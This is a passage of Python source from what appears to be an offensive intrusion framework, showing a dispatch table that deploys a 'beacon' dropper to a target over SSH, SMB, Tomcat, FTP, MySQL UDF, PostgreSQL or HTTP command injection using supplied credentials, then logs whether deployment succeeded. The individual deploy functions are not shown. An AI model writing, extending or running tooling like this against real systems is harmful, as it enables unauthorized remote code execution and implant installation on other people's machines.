        "ssh":              lambda: deploy_beacon_via_ssh(target, port, creds["username"], creds["password"], dropper),
        "smb_rce":          lambda: deploy_beacon_via_smb(target, creds["username"], creds["password"], dropper),
        "http_tomcat_rce":  lambda: deploy_beacon_via_tomcat(target, port, creds["username"], creds["password"], dropper),
        "ftp_upload_rce":   lambda: deploy_beacon_via_ftp(target, port, creds["username"], creds["password"], dropper),
        "mysql_udf_rce":    lambda: deploy_beacon_via_mysql(target, port, creds["username"], creds["password"], dropper),
        "postgresql_rce":   lambda: deploy_beacon_via_postgresql(target, port, creds["username"], creds["password"], dropper),
        "http_cmd_injection": lambda: execute_http_rce(target, port, dropper, creds.get("path", "/")),
        "http_cms_rce":     lambda: (notifier.warn("CMS RCE requires manual exploitation. Use generic HTTP injection."), (False, "")),
    }

    deploy_fn = deploy_map.get(method)
    if not deploy_fn:
        notifier.warn(f"RCE method '{method}' not yet implemented.")
        console.print(f"  Manual command: {dropper}")
        return False

    success, output = deploy_fn()

    if success:
        notifier.success(f"Beacon deployed successfully to {target} via {method}")
        return True
    else:
        notifier.error(f"Beacon deployment failed via {method}: {output[:200]}")
        return False